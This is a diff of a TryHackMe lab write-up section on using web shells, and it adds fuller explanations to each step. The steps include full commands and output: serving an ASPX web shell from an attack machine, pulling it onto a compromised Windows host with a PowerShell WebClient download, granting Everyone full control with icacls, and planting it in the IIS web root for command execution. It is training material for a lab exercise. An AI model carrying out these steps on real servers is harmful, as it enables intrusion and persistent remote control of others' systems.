@@ -7,24 +7,24 @@ This writeup was last updated: 07/06/2023
 
 # Using Web Shells
 1. Started this room's machine
-2. `firefox <URL>`
+2. `firefox <URL>` from our Linux attack machine to launch Firefox and redirect it to the ASP.NET web shell Github repository, which we'll then download onto our attack machine 
 ```Bash
 root@ip-10-10-32-42:~# firefox https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
 ```
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Firefox%20cmdaspx.net%20Github.png)
 
-3. `sudo python -m http.server`
+3. `sudo python -m http.server` from our Linux attack machine to start a simple HTTP server on our attack machine to allow our compromised machine to connect back to our attack machine and download the ASP.NET web shell file that we just downloaded from Github
 ```Bash
 root@ip-10-10-32-42:~# sudo python -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 ```
-4. `(New-Object System.Net.WebClient).Downloadfile('http://<ATTACK MACHINE IP>:8000/<ASPX.NET WEB SHELL FILE1>','<ASPX.NET WEB SHELL FILE2>.exe')`
+4. `(New-Object System.Net.WebClient).Downloadfile('http://<ATTACK MACHINE IP>:8000/<ASPX.NET WEB SHELL FILE1>','<ASPX.NET WEB SHELL FILE2>.exe')` from our compromised Windows machine to download the ASP.NET web shell file from our attack machine and save it onto this machine with a different name
 ```PowerShell
 PS C:\Users\Administrator> (New-Object System.Net.WebClient).Downloadfile('http://10.10.32.42:8000/cmdasp.aspx','shell.aspx')
 ```
-5. `dir`
+5. `dir` from our compromised Windows machine to display the files and directories of our current working directory onto our terminal to verify if the ASP.NET web shell file was successfully downloaded from our attack machine, which it was
 ```PowerShell
 PS C:\Users\Administrator> dir
     Directory: C:\Users\Administrator
@@ -44,25 +44,25 @@ d-r---        3/17/2021   3:13 PM                Searches
 d-r---        3/17/2021   3:13 PM                Videos
 -a----         7/7/2023   9:00 PM          20216 shell.aspx
 ```
-6. `icacls <ASPX,WEB SHELL FILE PATH> /grant Everyone:F`
+6. `icacls <ASPX.NET WEB SHELL FILE PATH> /grant Everyone:F` from our compromised Windows machine to grant all the users in the system full access and control to the ASP.NET web shell file that we just downloaded from our attack machine
 ```PowerShell
 PS C:\Users\Administrator> icacls shell.aspx /grant Everyone:F
 processed file: shell.aspx
 Successfully processed 1 files; Failed processing 0 files
 ```
-7. `move shell.aspx C:\inetpub\wwwroot\`
+7. `move <FILE> <DESTINATION PATH>` from our compromised Windows machine to move the <ASPX.NET WEB SHELL FILE2> web shell file to the **C:\inetpub\wwwroot** directory, which is the default directory where web content is stored for the IIS (Internet Information Services) web server, which is a web server software that was developed by Microsoft for Windows that provides the infrastructure and services necessary to host and manage websites, web applications, and other web services
 ```PowerShell
 PS C:\Users\Administrator>move shell.aspx C:\inetpub\wwwroot\
         1 file(s) moved.
 ```
-8. `explorer.exe "http://<TARGET IP>/shell.aspx"`
+8. `explorer.exe "http://<TARGET IP>/shell.aspx"` from our compromised Windows machine to launch the Windows Explorer web browser and redirect it to our ASP.NET web shell, which brought us to a web shell that used to run commands on the system 
 ```PowerShell
 PS C:\Users\Administrator> explorer.exe http://10.10.219.169/shell.aspx
 ```
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/ASPX.NET%20Web%20Shell%20Open.png)
 
-9. `C:\flags\flag16.exe`
+9. `C:\flags\flag16.exe` from our compromised Windows machine's web shell to run the **flag16.exe**  
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/ASPX.NET%20Web%20Shell%20Flag.png)
 
